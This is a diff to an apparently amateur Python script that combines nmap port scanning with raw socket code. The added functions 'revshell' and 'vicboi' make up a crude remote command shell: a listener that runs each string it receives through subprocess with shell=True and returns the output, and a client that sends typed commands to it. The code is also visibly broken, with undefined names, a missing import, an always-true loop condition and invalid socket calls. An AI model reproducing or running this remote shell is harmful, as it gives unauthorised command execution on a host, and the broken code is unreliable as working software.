@@ -4,6 +4,8 @@ import nmap
 import pyfiglet
 import socket
 import requests
+from subprocess import check_output
+
 
 looker = nmap.PortScanner()
 
@@ -21,6 +23,35 @@ ipaddr = input("enter the IP address you want to scan: ")
 print("The IP you entered is: ", ipaddr)
 type(ipaddr)
 
+def revshell():
+    with sockboi as s:
+        try:
+            s.connect((ipaddr, servport))
+            com = input("$")
+            while com != 'quit' or 'exit':
+                s.send(com.encode())
+                out = s.recv(2048).decode()
+                com = input("$")
+                print(out)
+                s.close()
+        except:
+            print("Unable to connect, an error has occured")
+
+def vicboi():
+    with sockboi as s:
+        s.bind((ipaddr, servport))
+        s.listen(2)
+        me, addr = s.accept()
+        com = me.recv(2048)
+        while com != 'quit' or 'exit':
+            com = str(com)
+            out = subprocess.check_call(com, shell=True)
+            me.send(out.encode())
+            com = me.recv(2048)
+        com.close()
+    s.close()
+    
+
 
 def server():
     with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
@@ -35,7 +66,7 @@ def server():
 def client():
     with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
         s.connect((myip, servport))
-        data = s.recv(1-1501)
+        data = s.recv(b"")
         print(data)
 
     input()
@@ -61,11 +92,8 @@ else:
         print("DA OPEN PORTS ARE: ", looker[ipaddr][respopt[resp][1]].keys())
         try:
             for port in range(1,1501):
-                if looker[ipaddr].scaninfo() == "up" and looker[ipaddr].state == True:
-                    nmap.connect()
-                    print("open, up and connecting...")
-        except:
-            print("[]<-CLOSED->[]")
+                if port == True:
+                    server()
 
 
 
